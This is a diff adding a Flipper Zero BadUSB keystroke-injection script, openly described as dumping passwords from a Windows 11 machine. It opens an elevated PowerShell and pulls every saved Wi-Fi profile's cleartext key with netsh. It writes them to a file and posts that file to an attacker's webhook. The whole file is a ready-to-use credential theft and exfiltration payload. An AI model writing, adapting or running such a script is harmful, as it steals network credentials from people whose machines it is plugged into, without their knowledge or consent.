@@ -1,0 +1,80 @@
+               ________       .__                 __  .__         ________                   __                                    
+REM Made by   /  _____/_____  |  | _____    _____/  |_|__| ____   \______ \   ____   _______/  |________  ____ ___.__. ___________ 
+             /   \  ___\__  \ |  | \__  \ _/ ___\   __\  |/ ___\   |    |  \_/ __ \ /  ___/\   __\_  __ \/  _ <   |  |/ __ \_  __ \
+             \    \_\  \/ __ \|  |__/ __ \\  \___|  | |  \  \___   |    `   \  ___/ \___ \  |  |  |  | \(  <_> )___  \  ___/|  | \/
+              \______  (____  /____(____  /\___  >__| |__|\___  > /_______  /\___  >____  > |__|  |__|   \____// ____|\___  >__|   
+                     \/     \/          \/     \/             \/          \/     \/     \/                     \/         \/       
+REM This is a Flipper Zero Bad usb script to dump all password off a Windows 11 machine
+
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 1000
+LEFTARROW
+DELAY 500
+ENTER
+STRING $apiUrl = "Add You're Webhook link Between these Quotes"
+DELAY 500
+ENTER
+STRING $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
+DELAY 100
+ENTER
+STRING foreach ($profile in $profiles) {
+DELAY 100
+ENTER
+STRING Add-Content -Path $outputFile -Value "Profile: $profile"
+DELAY 100
+ENTER
+STRING $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
+DELAY 100
+ENTER
+STRING if ($password) { Add-Content -Path $outputFile -Value $password }
+DELAY 100
+ENTER
+STRING else { Add-Content -Path $outputFile -Value "Key Content: No password found" }
+DELAY 100
+ENTER
+STRING Add-Content -Path $outputFile -Value "`n" }
+DELAY 100
+ENTER
+STRING $fileBytes = [System.IO.File]::ReadAllBytes($outputFile)
+DELAY 500
+ENTER
+STRING $boundary = [System.Guid]::NewGuid().ToString()
+DELAY 500
+ENTER
+STRING $headers = @{
+DELAY 100
+ENTER
+STRING "Content-Type" = "multipart/form-data; boundary=$boundary"
+DELAY 100
+ENTER
+STRING }
+DELAY 100
+ENTER
+STRING $body = "--$boundary`r`n"
+DELAY 100
+ENTER
+STRING $body += "Content-Disposition: form-data; name=`"file`"; filename=`"WiFiProfilesAndPasswords.txt`"`r`n"
+DELAY 100
+ENTER
+STRING $body += "Content-Type: text/plain`r`n`r`n"
+DELAY 100
+ENTER
+STRING $body += [System.Text.Encoding]::UTF8.GetString($fileBytes)
+DELAY 100
+ENTER
+STRING $body += "`r`n--$boundary--`r`n"
+DELAY 100
+ENTER
+STRING $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -Body $body
+DELAY 100
+ENTER
+DELAY 1000
+DELAY 500
+STRING exit
+DELAY 100
+ENTER
+
